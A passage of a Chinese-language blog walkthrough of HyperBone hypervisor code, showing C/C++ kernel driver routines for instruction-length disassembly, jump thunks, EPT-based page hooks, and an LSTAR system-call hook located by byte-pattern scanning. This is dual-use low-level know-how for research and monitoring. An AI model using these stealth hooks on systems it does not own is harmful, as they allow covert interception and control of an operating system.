class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title">ldasm</span><span class="params">( <span class="type">void</span> *code, ldasm_data *ld, ULONG is64 )</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> Description:</span></span></span><br><span class="line"><span class="comment"><span class="function"> Disassemble one instruction</span></span></span><br><span class="line"><span class="comment"><span class="function"></span></span></span><br><span class="line"><span class="comment"><span class="function"> Arguments:</span></span></span><br><span class="line"><span class="comment"><span class="function"> code    - pointer to the code for disassemble</span></span></span><br><span class="line"><span class="comment"><span class="function"> ld        - pointer to structure ldasm_data</span></span></span><br><span class="line"><span class="comment"><span class="function"> is64    - set this flag for 64-bit code, and clear for 32-bit</span></span></span><br><span class="line"><span class="comment"><span class="function"></span></span></span><br><span class="line"><span class="comment"><span class="function"> Return:</span></span></span><br><span class="line"><span class="comment"><span class="function"> length of instruction</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UCHAR *p = (UCHAR*)code;</span><br><span class="line">    UCHAR s, op, f;</span><br><span class="line">    UCHAR rexw, pr_66, pr_67;</span><br><span class="line"></span><br><span class="line">    s = rexw = pr_66 = pr_67 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dummy check */</span></span><br><span class="line">    <span class="keyword">if</span> (!code || !ld)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init output data */</span></span><br><span class="line">    <span class="built_in">memset</span>( ld, <span class="number">0</span>, <span class="built_in">sizeof</span>( ldasm_data ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 1: parse prefixies */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cflags</span>( *p ) &amp; OP_PREFIX) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*p == <span class="number">0x66</span>)</span><br><span class="line">            pr_66 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (*p == <span class="number">0x67</span>)</span><br><span class="line">            pr_67 = <span class="number">1</span>;</span><br><span class="line">        p++; s++;</span><br><span class="line">        ld-&gt;flags |= F_PREFIX;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="number">15</span>) &#123;</span><br><span class="line">            ld-&gt;flags |= F_INVALID;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* parse REX prefix */</span></span><br><span class="line">    <span class="keyword">if</span> (is64 &amp;&amp; *p &gt;&gt; <span class="number">4</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        ld-&gt;rex = *p;</span><br><span class="line">        rexw = (ld-&gt;rex &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>;</span><br><span class="line">        ld-&gt;flags |= F_REX;</span><br><span class="line">        p++; s++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* can be only one REX prefix */</span></span><br><span class="line">    <span class="keyword">if</span> (is64 &amp;&amp; *p &gt;&gt; <span class="number">4</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        ld-&gt;flags |= F_INVALID;</span><br><span class="line">        s++;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 2: parse opcode */</span></span><br><span class="line">    ld-&gt;opcd_offset = (UCHAR)(p - (UCHAR*)code);</span><br><span class="line">    ld-&gt;opcd_size = <span class="number">1</span>;</span><br><span class="line">    op = *p++; s++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* is 2 byte opcode? */</span></span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">0x0F</span>) &#123;</span><br><span class="line">        op = *p++; s++;</span><br><span class="line">        ld-&gt;opcd_size++;</span><br><span class="line">        f = <span class="built_in">cflags_ex</span>( op );</span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_INVALID) &#123;</span><br><span class="line">            ld-&gt;flags |= F_INVALID;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* for SSE instructions */</span></span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_EXTENDED) &#123;</span><br><span class="line">            op = *p++; s++;</span><br><span class="line">            ld-&gt;opcd_size++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        f = <span class="built_in">cflags</span>( op );</span><br><span class="line">        <span class="comment">/* pr_66 = pr_67 for opcodes A0-A3 */</span></span><br><span class="line">        <span class="keyword">if</span> (op &gt;= <span class="number">0xA0</span> &amp;&amp; op &lt;= <span class="number">0xA3</span>)</span><br><span class="line">            pr_66 = pr_67;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 3: parse ModR/M, SIB and DISP */</span></span><br><span class="line">    <span class="keyword">if</span> (f &amp; OP_MODRM) &#123;</span><br><span class="line">        UCHAR    mod = (*p &gt;&gt; <span class="number">6</span>);</span><br><span class="line">        UCHAR    ro = (*p &amp; <span class="number">0x38</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">        UCHAR    rm = (*p &amp; <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        ld-&gt;modrm = *p++; s++;</span><br><span class="line">        ld-&gt;flags |= F_MODRM;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* in F6,F7 opcodes immediate data present if R/O == 0 */</span></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">0xF6</span> &amp;&amp; (ro == <span class="number">0</span> || ro == <span class="number">1</span>))</span><br><span class="line">            f |= OP_DATA_I8;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">0xF7</span> &amp;&amp; (ro == <span class="number">0</span> || ro == <span class="number">1</span>))</span><br><span class="line">            f |= OP_DATA_I16_I32_I64;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* is SIB byte exist? */</span></span><br><span class="line">        <span class="keyword">if</span> (mod != <span class="number">3</span> &amp;&amp; rm == <span class="number">4</span> &amp;&amp; !(!is64 &amp;&amp; pr_67)) &#123;</span><br><span class="line">            ld-&gt;sib = *p++; s++;</span><br><span class="line">            ld-&gt;flags |= F_SIB;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* if base == 5 and mod == 0 */</span></span><br><span class="line">            <span class="keyword">if</span> ((ld-&gt;sib &amp; <span class="number">7</span>) == <span class="number">5</span> &amp;&amp; mod == <span class="number">0</span>) &#123;</span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (mod) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (is64) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">5</span>) &#123;</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">if</span> (is64)</span><br><span class="line">                        ld-&gt;flags |= F_RELATIVE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pr_67) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">6</span>)</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (rm == <span class="number">5</span>)</span><br><span class="line">                    ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ld-&gt;disp_size = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> (is64)</span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pr_67)</span><br><span class="line">                ld-&gt;disp_size = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ld-&gt;disp_size = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ld-&gt;disp_size) &#123;</span><br><span class="line">            ld-&gt;disp_offset = (UCHAR)(p - (UCHAR *)code);</span><br><span class="line">            p += ld-&gt;disp_size;</span><br><span class="line">            s += ld-&gt;disp_size;</span><br><span class="line">            ld-&gt;flags |= F_DISP;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* phase 4: parse immediate data */</span></span><br><span class="line">    <span class="keyword">if</span> (rexw &amp;&amp; f &amp; OP_DATA_I16_I32_I64)</span><br><span class="line">        ld-&gt;imm_size = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f &amp; OP_DATA_I16_I32 || f &amp; OP_DATA_I16_I32_I64)</span><br><span class="line">        ld-&gt;imm_size = <span class="number">4</span> - (pr_66 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if exist, add OP_DATA_I16 and OP_DATA_I8 size */</span></span><br><span class="line">    ld-&gt;imm_size += f &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ld-&gt;imm_size) &#123;</span><br><span class="line">        s += ld-&gt;imm_size;</span><br><span class="line">        ld-&gt;imm_offset = (UCHAR)(p - (UCHAR *)code);</span><br><span class="line">        ld-&gt;flags |= F_IMM;</span><br><span class="line">        <span class="keyword">if</span> (f &amp; OP_RELATIVE)</span><br><span class="line">            ld-&gt;flags |= F_RELATIVE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* instruction is too long */</span></span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">15</span>)</span><br><span class="line">        ld-&gt;flags |= F_INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造跳转指令字节码"><a href="#构造跳转指令字节码" class="headerlink" title="构造跳转指令字节码"></a>构造跳转指令字节码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Construct jump </span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pThunk&quot;&gt;Data to initialize&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;To&quot;&gt;Address of jump&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">PHpInitJumpThunk</span><span class="params">( IN OUT PJUMP_THUNK pThunk, IN ULONG64 To )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PULARGE_INTEGER liTo = (PULARGE_INTEGER)&amp;To;<span class="comment">// 无符号64位整数</span></span><br><span class="line"></span><br><span class="line">    pThunk-&gt;PushOp = <span class="number">0x68</span>;<span class="comment">// 推入32位立即数</span></span><br><span class="line">    pThunk-&gt;AddressLow = liTo-&gt;LowPart;<span class="comment">// 低32位地址</span></span><br><span class="line">    pThunk-&gt;MovOp = <span class="number">0x042444C7</span>;<span class="comment">// 将32位常数移动到指定内存</span></span><br><span class="line">    pThunk-&gt;AddressHigh = liTo-&gt;HighPart;<span class="comment">// 高32位地址</span></span><br><span class="line">    pThunk-&gt;RetOp = <span class="number">0xC3</span>;<span class="comment">// 返回指令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="每个CPU页面钩子和解钩的回调函数"><a href="#每个CPU页面钩子和解钩的回调函数" class="headerlink" title="每个CPU页面钩子和解钩的回调函数"></a>每个CPU页面钩子和解钩的回调函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Per-CPU page hook/unhook routine</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Context&quot;&gt;Valid PHOOK_CONTEXT&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">PHpHookCallbackDPC</span><span class="params">( IN PRKDPC Dpc, IN PVOID Context, IN PVOID SystemArgument1, IN PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );</span><br><span class="line">    PHOOK_CONTEXT pCTX = (PHOOK_CONTEXT)Context;<span class="comment">// hook上下文</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pCTX != <span class="literal">NULL</span>)<span class="comment">// 进行hook或unhook</span></span><br><span class="line">        __vmx_vmcall( pCTX-&gt;Hook ? HYPERCALL_HOOK_PAGE : HYPERCALL_UNHOOK_PAGE, pCTX-&gt;DataPagePFN, pCTX-&gt;CodePagePFN, <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( SystemArgument2 );<span class="comment">// 发出同步信号</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );<span class="comment">// 通知DPC执行完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解除页面钩子"><a href="#解除页面钩子" class="headerlink" title="解除页面钩子"></a>解除页面钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Restore hooked function</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHRestore</span><span class="params">( IN PVOID pFunc )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 不支持执行保护，无法恢复</span></span><br><span class="line">    <span class="keyword">if</span> (!g_Data-&gt;Features.ExecOnlyEPT)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取要恢复函数的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pHookEntry = <span class="built_in">PHGetHookEntry</span>( pFunc );</span><br><span class="line">    <span class="keyword">if</span> (pHookEntry == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始字节，根据页面钩子数量</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PHPageHookCount</span>( pFunc, DATA_PAGE ) &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 存在其他CPU正在使用页面钩子，需要进行原子性的内存补丁操作</span></span><br><span class="line">        <span class="comment">// 将原始的字节数据从钩子页中复制回原始函数所在的页面。这样可以确保其他CPU在执行期间的一致性。</span></span><br><span class="line">        ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)<span class="built_in">PAGE_ALIGN</span>( pFunc );</span><br><span class="line">        <span class="built_in">memcpy</span>( (PUCHAR)pHookEntry-&gt;CodePageVA + page_offset, pHookEntry-&gt;OriginalData, pHookEntry-&gt;OriginalSize );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 只被一个CPU钩子的函数，将钩子所在页面与原始函数所在的页面进行交换，以还原函数的内容</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        HOOK_CONTEXT ctx = &#123; <span class="number">0</span> &#125;;<span class="comment">// 临时HOOK_CONTEXT结构体</span></span><br><span class="line">        ctx.Hook = FALSE;</span><br><span class="line">        ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN;</span><br><span class="line">        ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Dpc回调Unhook模式</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( PHpHookCallbackDPC, &amp;ctx );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放钩子信息缓存</span></span><br><span class="line">    <span class="built_in">MmFreeContiguousMemory</span>( pHookEntry-&gt;CodePageVA );</span><br><span class="line">    <span class="built_in">RemoveEntryList</span>( &amp;pHookEntry-&gt;Link );</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>( pHookEntry, HB_POOL_TAG );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算当前函数有多少个hook"><a href="#计算当前函数有多少个hook" class="headerlink" title="计算当前函数有多少个hook"></a>计算当前函数有多少个hook</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get number of hooks in one page</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Number of hooks&lt;/returns&gt;</span></span><br><span class="line"><span class="function">ULONG <span class="title">PHPageHookCount</span><span class="params">( IN PVOID ptr, IN PAGE_TYPE Type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 检查是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取页面地址</span></span><br><span class="line">    PVOID page = <span class="built_in">PAGE_ALIGN</span>( ptr );</span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断钩子的页面类型、数据是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page))</span><br><span class="line">            count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统调用入口钩子"><a href="#系统调用入口钩子" class="headerlink" title="系统调用入口钩子"></a>系统调用入口钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Perform LSTAR hooking</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHInitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    LSTAR是一个MSR（Machine Specific Register），它保存了系统调用（system call）的入口地址，</span></span><br><span class="line"><span class="comment">    hooking LSTAR就可以实现对所有系统调用的监控和拦截。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有SSDT</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">UtilSSDTBase</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SSDT base not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KiSystemServiceCopyEnd</span></span><br><span class="line">    <span class="comment">// 这个函数用于将系统调用的参数从用户空间复制到内核空间并调用具体的系统调用处理函数</span></span><br><span class="line">    <span class="comment">// F7 05 ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? 0F 85 ? ? ? ? ? ? ? ? 41 FF D2</span></span><br><span class="line">    <span class="keyword">if</span> (KiServiceCopyEndPtr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 搜索KiSystemServiceCopyEnd函数特征码找到地址</span></span><br><span class="line">        CHAR pattern[] = <span class="string">&quot;\xF7\x05\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x0F\x85\xcc\xcc\xcc\xcc\x41\xFF\xD2&quot;</span>;</span><br><span class="line">        status = <span class="built_in">UtilScanSection</span>( <span class="string">&quot;.text&quot;</span>, (PCUCHAR)pattern, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>( pattern ) - <span class="number">1</span>, (PVOID)&amp;KiServiceCopyEndPtr );</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: KiSystemServiceCopyEnd not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hook LSTAR</span></span><br><span class="line">    <span class="keyword">if</span> (KiSystemCall64Ptr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        KiSystemCall64Ptr = __readmsr( MSR_LSTAR );<span class="comment">// 原始LSTAR地址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Something isn&#x27;t right</span></span><br><span class="line">        <span class="keyword">if</span> (KiSystemCall64Ptr == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在DPC回调中hook，修改LSTAR寄存器的值为SyscallEntryPoint定义的函数</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( SHpHookCallbackDPC, (PVOID)(ULONG_PTR)SyscallEntryPoint );</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在内核PE文件的指定section中查找指定的pattern"><a href="#在内核PE文件的指定section中查找指定的pattern" class="headerlink" title="在内核PE文件的指定section中查找指定的pattern"></a>在内核PE文件的指定section中查找指定的pattern</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 